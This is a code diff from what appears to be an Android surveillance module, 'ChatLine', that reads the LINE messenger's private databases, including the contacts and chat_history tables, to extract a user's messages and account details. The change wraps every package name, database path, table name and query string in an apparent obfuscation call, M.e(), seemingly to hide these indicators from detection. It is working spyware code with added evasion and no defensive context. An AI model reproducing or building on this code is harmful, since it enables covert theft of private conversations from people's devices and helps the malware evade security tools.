@@ -22,9 +22,9 @@ public class ChatLine extends SubModuleChat {
 	private static final String TAG = "ChatLine";
 
 	private static final int PROGRAM = 0x0d;
-	String pObserving = "jp.naver.line.android";
-	String dbFile = "/data/data/jp.naver.line.android/databases/naver_line";
-	String dbAccountFile = "/data/data/jp.naver.line.android/databases/naver_line_myhome";
+	String pObserving = M.e("jp.naver.line.android");
+	String dbFile = M.e("/data/data/jp.naver.line.android/databases/naver_line");
+	String dbAccountFile = M.e("/data/data/jp.naver.line.android/databases/naver_line_myhome");
 
 	private Date lastTimestamp;
 
@@ -105,7 +105,7 @@ public class ChatLine extends SubModuleChat {
 	private String readMyPhoneNumber(List<String> mymids) {
 
 		RecordHashPairVisitor visitorContacts = new RecordHashPairVisitor("m_id", "name");
-		helper.traverseRecords("contacts", visitorContacts);
+		helper.traverseRecords(M.e("contacts"), visitorContacts);
 
 		for (String pmid : mymids) {
 			if (!visitorContacts.containsKey(pmid)) {
@@ -118,8 +118,8 @@ public class ChatLine extends SubModuleChat {
 		}
 
 		RecordStringVisitor visitorContent = new RecordStringVisitor("content");
-		visitorContent.selection = "server_id is null";
-		helper.traverseRecords("chat_history", visitorContent);
+		visitorContent.selection = M.e("server_id is null");
+		helper.traverseRecords(M.e("chat_history"), visitorContent);
 
 		for (String content : visitorContent.getRecords()) {
 
